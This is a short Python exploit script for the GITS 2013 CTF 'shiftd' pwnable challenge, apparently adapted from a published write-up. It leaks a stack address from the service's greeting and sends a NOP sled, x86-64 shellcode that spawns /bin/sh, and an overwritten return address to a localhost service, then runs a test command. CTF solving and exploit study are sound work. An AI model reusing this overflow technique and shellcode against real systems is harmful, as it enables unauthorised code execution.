#!/usr/bin/python

# from http://codezen.fr/2013/02/17/gits-2013-ctf-pwnable-100-question-8-shiftd/
# This binary runs over stdin/stdout, so run it with the stdio server

import socket
from struct import pack, unpack

host = 'localhost'
port = 1098

shellcode = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

always = b'Thank you! Come again!'

def main(_):
    #print('starting exploit')
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))

    s.send(b"NowIsTheWinterOfOurDiscountTent\n")

    data = s.recv(16384)
    #print('recv 1', repr(data))

    s.send(b"\n")

    data = s.recv(16384)
    stack = data[len('Welcome, '):len('Welcome, ')+6] +b"\x00\x00"

    stack_addr = unpack('<Q', stack)[0]

    #print("stack_addr=", hex(stack_addr))

    retip = pack('<Q', stack_addr - 0x840)

    #print('retip=', repr(retip), len(retip))

    s.send(b'\x90' * 16 + shellcode + b'A' * (1064 - 16 - len(shellcode)) + retip + b"\n")

    data = s.recv(32768)
    #print('recv 2', repr(data))

    try:
        s.send(b"\necho Haha totally pwned\n")
        data += s.recv(32768)
    except: # pylint: disable=bare-except
        data += b'(crashed)'

    return data

if __name__ == '__main__':
    print(main('shifty'))
